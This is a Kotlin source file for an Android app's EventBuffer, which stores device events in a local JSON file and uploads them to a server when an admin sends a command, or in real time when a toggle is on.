package com.abuzahra.manager

import android.content.Context
import android.util.Log
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.util.DeviceUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ConcurrentLinkedQueue
import java.util.concurrent.atomic.AtomicBoolean

/**
 * EventBuffer - Buffers all device events locally.
 * Events are stored in a local file and only sent to the server when explicitly requested.
 * A toggle controls whether events are also sent in real-time.
 *
 * Default behavior: events are ONLY stored locally (auto-send is OFF).
 * Admin can request all buffered events via "get_device_events" command.
 * Admin can toggle real-time sending via "events_on" / "events_off" commands.
 */
object EventBuffer {

    private const val TAG = "EventBuffer"
    private const val PREFS_NAME = "event_buffer"
    private const val KEY_AUTO_SEND = "auto_send_enabled"
    private const val MAX_BUFFER_SIZE = 5000
    private const val MAX_FILE_SIZE = 5 * 1024 * 1024 // 5MB per file

    private val autoSendEnabled = AtomicBoolean(false)
    private val bufferQueue = ConcurrentLinkedQueue<BufferedEvent>()
    private var initialized = false

    data class BufferedEvent(
        val eventType: String,
        val data: Map<String, Any?>,
        val timestamp: Long = System.currentTimeMillis()
    )

    /**
     * Initialize the buffer from preferences and load any existing file
     */
    fun init(context: Context) {
        if (initialized) return
        initialized = true

        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        autoSendEnabled.set(prefs.getBoolean(KEY_AUTO_SEND, false))

        // Load any previously buffered events from file
        loadFromFile(context)

        Log.i(TAG, "Initialized: autoSend=$autoSendEnabled, buffered=${bufferQueue.size}")
    }

    /**
     * Add an event to the buffer. Always stores locally.
     * If auto-send is enabled, also sends to server immediately.
     * Uses App.instance for context - safe to call from any thread.
     */
    fun addEvent(eventType: String, data: Map<String, Any?>) {
        val event = BufferedEvent(eventType, data)

        // Always store locally
        bufferQueue.add(event)
        while (bufferQueue.size > MAX_BUFFER_SIZE) {
            bufferQueue.poll()
        }

        // Persist to file (async, non-blocking)
        CoroutineScope(Dispatchers.IO).launch {
            try {
                saveToFile(App.instance)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to save event to file", e)
            }
        }

        // If auto-send is enabled, also send to server
        if (autoSendEnabled.get()) {
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val ctx = App.instance
                    val deviceId = DeviceUtils.getDeviceId(ctx)
                    ApiClient.sendEvent(deviceId, eventType, data)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to auto-send event", e)
                }
            }
        }
    }

    /**
     * Get all buffered events and send them as one batch via the data endpoint.
     * Clears the buffer after successful send.
     * Returns a map with the result info.
     */
    fun flushEvents(): Map<String, Any> {
        val ctx = App.instance
        val events = bufferQueue.toList()
        if (events.isEmpty()) {
            return mapOf(
                "status" to "empty",
                "message" to "No buffered events",
                "count" to 0
            )
        }

        // Build the events data structure
        val eventsJson = JSONArray()
        for (event in events) {
            val obj = JSONObject()
            obj.put("event_type", event.eventType)
            obj.put("timestamp", event.timestamp)
            obj.put("datetime", formatTimestamp(event.timestamp))
            val dataObj = JSONObject()
            for ((key, value) in event.data) {
                when (value) {
                    is String -> dataObj.put(key, value)
                    is Number -> dataObj.put(key, value)
                    is Boolean -> dataObj.put(key, value)
                    is Map<*, *> -> dataObj.put(key, JSONObject(value as Map<*, *>))
                    is List<*> -> dataObj.put(key, JSONArray(value))
                    null -> dataObj.put(key, JSONObject.NULL)
                    else -> dataObj.put(key, value.toString())
                }
            }
            obj.put("data", dataObj)
            eventsJson.put(obj)
        }

        val eventsString = eventsJson.toString()

        // Use a CompletableDeferred instead of runBlocking
        val deferred = kotlinx.coroutines.CompletableDeferred<Boolean>()
        kotlinx.coroutines.GlobalScope.launch(kotlinx.coroutines.Dispatchers.IO) {
            try {
                val deviceId = DeviceUtils.getDeviceId(ctx)
                ApiClient.sendData(ctx, "device_events", mapOf(
                    "device_id" to deviceId,
                    "event_count" to events.size,
                    "events" to eventsString
                ))
                deferred.complete(true)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to flush events", e)
                deferred.complete(false)
            }
        }

        // For now, clear immediately (fire-and-forget, non-blocking)
        bufferQueue.clear()
        CoroutineScope(Dispatchers.IO).launch {
            try { deleteBufferFile(ctx) } catch (_: Exception) {}
        }

        Log.i(TAG, "Flushing ${events.size} events (${eventsString.length} chars)")
        return mapOf(
            "status" to "sent",
            "message" to "Sending ${events.size} buffered events",
            "count" to events.size,
            "size_bytes" to eventsString.length
        )
    }

    /**
     * Toggle auto-send on/off. Persists to SharedPreferences.
     */
    fun setAutoSend(enabled: Boolean): String {
        autoSendEnabled.set(enabled)
        App.instance.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit()
            .putBoolean(KEY_AUTO_SEND, enabled)
            .apply()

        Log.i(TAG, "Auto-send set to: $enabled")
        return "Event auto-send ${if (enabled) "enabled" else "disabled"}. Buffered: ${bufferQueue.size} events"
    }

    /**
     * Check if auto-send is enabled
     */
    fun isAutoSendEnabled(): Boolean = autoSendEnabled.get()

    /**
     * Get the number of buffered events
     */
    fun getBufferedCount(): Int = bufferQueue.size

    /**
     * Get buffered events as a list
     */
    fun getBufferedEvents(): List<BufferedEvent> = bufferQueue.toList()

    /**
     * Clear all buffered events
     */
    fun clearBuffer() {
        bufferQueue.clear()
        CoroutineScope(Dispatchers.IO).launch {
            try {
                deleteBufferFile(App.instance)
            } catch (_: Exception) {}
        }
    }

    /**
     * Get buffer status info
     */
    fun getStatus(): Map<String, Any> {
        return mapOf(
            "auto_send" to autoSendEnabled.get(),
            "buffered_count" to bufferQueue.size,
            "max_buffer_size" to MAX_BUFFER_SIZE
        )
    }

    // ===== FILE PERSISTENCE =====

    private fun getBufferFile(context: Context): File {
        return File(context.filesDir, "event_buffer.json")
    }

    private fun saveToFile(context: Context) {
        try {
            val file = getBufferFile(context)
            if (file.exists() && file.length() > MAX_FILE_SIZE) {
                // Rotate: keep only recent events
                val recent = bufferQueue.toList().takeLast(MAX_BUFFER_SIZE / 2)
                bufferQueue.clear()
                bufferQueue.addAll(recent)
            }

            val json = JSONArray()
            for (event in bufferQueue) {
                val obj = JSONObject()
                obj.put("event_type", event.eventType)
                obj.put("timestamp", event.timestamp)
                val dataObj = JSONObject()
                for ((key, value) in event.data) {
                    when (value) {
                        is String -> dataObj.put(key, value)
                        is Number -> dataObj.put(key, value)
                        is Boolean -> dataObj.put(key, value)
                        null -> dataObj.put(key, JSONObject.NULL)
                        else -> dataObj.put(key, value.toString())
                    }
                }
                obj.put("data", dataObj)
                json.put(obj)
            }

            file.writeText(json.toString())
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save buffer to file", e)
        }
    }

    private fun loadFromFile(context: Context) {
        try {
            val file = getBufferFile(context)
            if (!file.exists()) return

            val jsonStr = file.readText()
            if (jsonStr.isBlank()) return

            val json = JSONArray(jsonStr)
            for (i in 0 until json.length()) {
                val obj = json.getJSONObject(i)
                val eventType = obj.getString("event_type")
                val timestamp = obj.getLong("timestamp")

                val data = mutableMapOf<String, Any?>()
                if (obj.has("data")) {
                    val dataObj = obj.getJSONObject("data")
                    for (key in dataObj.keys()) {
                        data[key] = if (dataObj.isNull(key)) null else dataObj.get(key)
                    }
                }

                bufferQueue.add(BufferedEvent(eventType, data, timestamp))
            }

            Log.i(TAG, "Loaded ${json.length()} events from file")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to load events from file", e)
        }
    }

    private fun deleteBufferFile(context: Context) {
        try {
            val file = getBufferFile(context)
            if (file.exists()) file.delete()
        } catch (_: Exception) {}
    }

    private fun formatTimestamp(timestamp: Long): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
        return sdf.format(Date(timestamp))
    }
}